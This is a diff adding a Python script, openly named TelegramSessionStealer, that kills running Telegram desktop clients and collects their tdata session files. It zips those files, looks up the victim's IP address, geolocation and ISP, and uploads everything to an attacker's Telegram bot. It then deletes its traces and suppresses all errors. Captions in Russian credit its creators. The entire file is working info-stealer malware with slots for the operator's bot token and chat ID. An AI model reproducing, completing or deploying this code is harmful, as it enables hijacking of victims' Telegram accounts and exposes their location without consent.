@@ -1,0 +1,282 @@
+import os
+import zipfile
+import tempfile
+import requests
+import psutil
+import time
+import warnings
+from datetime import datetime
+from pathlib import Path
+from typing import List, Optional, Dict, Any
+import sys
+import subprocess
+import importlib
+import sys
+import io
+sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+
+
+
+def install_packages():
+    required = {'requests', 'psutil'}
+    for package in required:
+        try:
+            importlib.import_module(package)
+        except ImportError:
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package], 
+                                stdout=subprocess.DEVNULL, 
+                                stderr=subprocess.DEVNULL)
+
+
+install_packages()
+
+
+install_packages()
+
+
+class TelegramSessionStealer:
+    def __init__(self):
+        warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
+        self.bot_token = "YOUR_TOKEN_HERE" # - YOUR BOT TOKEN HERE
+        self.admin_id = "YOUR_ID_HERE" # - YOUR ID HERE
+        self.target_clients = ["Telegram", "Telegram.exe", "AyuGram", "Kotatogram", "iMe"]
+        self.session_files = ["key_datas", "settingss", "usertag"]
+        self.session_subfiles = ["maps", "configs"]
+        self.standard_paths = [
+            Path(os.getenv('APPDATA')) / 'Telegram Desktop' / 'tdata',
+            Path(os.getenv('LOCALAPPDATA')) / 'Telegram Desktop' / 'tdata'
+        ]
+
+
+
+    def get_extended_ip_info(self) -> Dict[str, Any]:
+        ip_info = {
+            "ip": "Unknown",
+            "user_agent": "Unknown",
+            "language": "Unknown",
+            "time": datetime.now().strftime("%d.%m.%Y %H:%M (UTC%z)"),
+            "geolocation": {
+                "country": "Unknown",
+                "region": "Unknown",
+                "city": "Unknown",
+                "isp": "Unknown",
+                "asn": "Unknown",
+                "org": "Unknown"
+            },
+            "network": {
+                "proxy": False,
+                "vpn": False,
+                "tor": False
+            }
+        }
+        
+        try:
+            ip_response = requests.get("https://wtfismyip.com/json", timeout=6).json()
+            ip_info["ip"] = ip_response.get("YourFuckingIPAddress", "Unknown")
+            ip_info["user_agent"] = ip_response.get("YourFuckingUserAgent", "Unknown")
+            
+            geo_response = requests.get(f"http://ip-api.com/json/{ip_info['ip']}?fields=66846719", timeout=6).json()
+            if geo_response.get("status") == "success":
+                ip_info["geolocation"].update({
+                    "country": geo_response.get("country", "Unknown"),
+                    "region": geo_response.get("regionName", "Unknown"),
+                    "city": geo_response.get("city", "Unknown"),
+                    "isp": geo_response.get("isp", "Unknown"),
+                    "asn": geo_response.get("as", "Unknown"),
+                    "org": geo_response.get("org", "Unknown"),
+                    "latitude": geo_response.get("lat", "Unknown"),
+                    "longitude": geo_response.get("lon", "Unknown"),
+                    "timezone": geo_response.get("timezone", "Unknown"),
+                    "zip": geo_response.get("zip", "Unknown")
+                })
+                
+                ip_info["network"].update({
+                    "proxy": geo_response.get("proxy", False),
+                    "vpn": geo_response.get("vpn", False),
+                    "tor": geo_response.get("tor", False)
+                })
+            
+            lang_response = requests.get("https://ifconfig.co/json", timeout=6)
+            if lang_response.status_code == 200:
+                lang_data = lang_response.json()
+                ip_info["language"] = lang_data.get("headers", {}).get("Accept-Language", "Unknown").split(",")[0]
+            
+            return ip_info
+        except:
+            return ip_info
+    
+    def format_ip_info(self, ip_info: Dict[str, Any]) -> str:
+        formatted = f"🚨 Новый запуск!\n\n"
+        formatted += f"🌍 IP: {ip_info['ip']}\n"
+        formatted += f"├─User-Agent: {ip_info['user_agent']}\n"
+        formatted += f"├─Язык: {ip_info['language']}\n"
+        formatted += f"└─Время: {ip_info['time']}\n\n"
+        
+        formatted += f"🌐 Геолокация:\n"
+        formatted += f"├─Страна: {ip_info['geolocation']['country']}\n"
+        formatted += f"├─Регион: {ip_info['geolocation']['region']}\n"
+        formatted += f"├─Город: {ip_info['geolocation']['city']}\n"
+        formatted += f"├─Провайдер: {ip_info['geolocation']['isp']}\n"
+        formatted += f"├─ASN: {ip_info['geolocation']['asn']}\n"
+        formatted += f"├─Организация: {ip_info['geolocation']['org']}\n"
+        
+        if 'latitude' in ip_info['geolocation'] and 'longitude' in ip_info['geolocation']:
+            formatted += f"├─Координаты: {ip_info['geolocation']['latitude']}, {ip_info['geolocation']['longitude']}\n"
+            formatted += f"└─Карта: https://www.google.com/maps?q={ip_info['geolocation']['latitude']},{ip_info['geolocation']['longitude']}\n\n"
+        else:
+            formatted += "\n"
+        
+        formatted += f"🔌 Сеть:\n"
+        formatted += f"├─Прокси: {'Да' if ip_info['network']['proxy'] else 'Нет'}\n"
+        formatted += f"├─VPN: {'Да' if ip_info['network']['vpn'] else 'Нет'}\n"
+        formatted += f"└─Tor: {'Да' if ip_info['network']['tor'] else 'Нет'}\n\n"
+        
+        formatted += f"ℹ️ Whois: https://check-host.net/ip-info?host={ip_info['ip']}\n"
+        formatted += f"Создатели - [vkfreedom.t.me] x [swatcrimes.t.me]"
+        
+        return formatted
+    
+    def find_telegram_process(self) -> Optional[psutil.Process]:
+        try:
+            for proc in psutil.process_iter(['name', 'exe']):
+                if proc.info['name'] in self.target_clients:
+                    return proc
+        except:
+            pass
+        return None
+    
+    def kill_process(self, proc: psutil.Process) -> bool:
+        try:
+            proc.kill()
+            proc.wait(timeout=0.5)
+            return True
+        except:
+            return False
+    
+    def find_tdata_directory(self, process_path: Optional[str] = None) -> Optional[Path]:
+        
+        for path in self.standard_paths:
+            if path.exists():
+                return path
+        
+        
+        if process_path:
+            try:
+                process_dir = Path(process_path).parent
+                tdata_path = process_dir / "tdata"
+                if tdata_path.exists():
+                    return tdata_path
+            except:
+                pass
+        
+        return None
+    
+    def collect_session_files(self, tdata_path: Path) -> List[Path]:
+        files = []
+        
+        for file in self.session_files:
+            file_path = tdata_path / file
+            if file_path.exists():
+                files.append(file_path)
+        
+        for item in tdata_path.iterdir():
+            if item.is_dir():
+                marker_file = tdata_path / f"{item.name}s"
+                if marker_file.exists():
+                    files.extend([marker_file, item])
+                    
+                    for subfile in self.session_subfiles:
+                        subfile_path = item / subfile
+                        if subfile_path.exists():
+                            files.append(subfile_path)
+        
+        return files
+    
+
+    
+    def create_zip_archive(self, files: List[Path]) -> Optional[str]:
+        try:
+            temp_dir = tempfile.gettempdir()
+            zip_path = os.path.join(temp_dir, f"session_data_{os.getpid()}.zip")
+            
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for file in files:
+                    if file.is_file():
+                        zipf.write(file, file.name)
+                    elif file.is_dir():
+                        for f in file.rglob('*'):
+                            if f.is_file():
+                                arcname = os.path.join(file.name, os.path.relpath(f, file))
+                                zipf.write(f, arcname)
+            
+            return zip_path
+        except:
+            return None
+    
+    def send_to_telegram(self, zip_path: str, client_name: Optional[str], ip_info: Dict[str, Any]) -> bool:
+        try:
+            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
+            
+            caption = self.format_ip_info(ip_info)
+            if client_name:
+                caption = f"Client: {client_name}\n{caption}"
+            
+            with open(zip_path, 'rb') as f:
+                files = {'document': (f'session_data_{client_name or "unknown"}.zip', f)}
+                data = {
+                    'chat_id': self.admin_id,
+                    'caption': caption,
+                    'parse_mode': 'Markdown'
+                }
+                
+                response = requests.post(url, data=data, files=files)
+                return response.status_code == 200
+        except:
+            return False
+    
+    def cleanup(self, zip_path: str) -> None:
+        try:
+            if os.path.exists(zip_path):
+                os.remove(zip_path)
+        except:
+            pass
+    
+    def run(self) -> None:
+       
+        try:
+            ip_info = self.get_extended_ip_info()
+            proc = self.find_telegram_process()
+            client_name = None
+            process_path = None
+            
+            if proc is not None:
+                client_name = proc.info['name']
+                process_path = proc.info['exe']
+                self.kill_process(proc)  
+            
+
+            tdata_path = self.find_tdata_directory(process_path)
+
+            if tdata_path is None:
+                return
+            
+            files = self.collect_session_files(tdata_path)
+            if not files:
+                return
+            
+                        
+            zip_path = self.create_zip_archive(files)
+            if zip_path is None:
+                return
+            
+            
+            self.send_to_telegram(zip_path, client_name, ip_info)
+            self.cleanup(zip_path)
+
+            
+        except:
+            pass
+
+if __name__ == "__main__":
+    warnings.filterwarnings("ignore")
+    TelegramSessionStealer().run()
